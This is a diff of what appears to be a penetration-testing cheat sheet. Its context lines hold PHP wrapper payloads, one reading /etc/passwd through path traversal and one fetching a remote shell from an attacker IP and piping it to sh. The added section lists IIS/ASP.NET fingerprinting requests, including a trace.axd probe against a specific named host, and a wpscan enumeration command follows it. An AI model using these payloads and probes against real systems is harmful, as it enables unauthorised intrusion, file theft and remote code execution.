@@ -228,6 +228,46 @@ https://www.php.net/manual/en/wrappers.php
 index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file://../../../../../../../etc/passwd
 index.php?page=ssh2.exec://UERNAME:PASSWORD@127.0.0.1/curl+$MYIP:53/resh|sh;
 
+[*] ASPX
+
+[###] Debug
+DEBUG /default.aspx HTTP/1.1
+Command: stop-debug
+HTTP/1.1 200 OK
+
+[###] Version: IIS
+GET /favicon.ico HTTP/1.1
+HTTP/1.1 404 Not Found
+Server: Microsoft-IIS/10.0
+
+[###] Version: ASPNet
+GET /a.aspx HTTP/1.1
+
+HTTP/1.1 404 Not Found
+X-AspNet-Version: 4.0.30319
+X-Powered-By: ASP.NET
+
+[###] Version: Microsoft HTTP API
+PUT / HTTP/1.1
+
+HTTP/1.1 411 Length Required
+Server: Microsoft-HTTPAPI/2.0
+
+[###] Trace Enabled On Server
+GET /trace.axd HTTP/1.1
+Host: amdocscsr.web.tflpp.co.uk
+
+HTTP/1.1 403 Forbidden
+<pre>
+	configuration
+	system.web
+	trace localOnly="false"
+	/system.web
+	/configuration
+</pre>
+
+
+
 [*] WordPress
 wpscan --update > /dev/null; wpscan -e ap,t,tt,u --api-token $WPSCAN_API --url ://$DOM
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
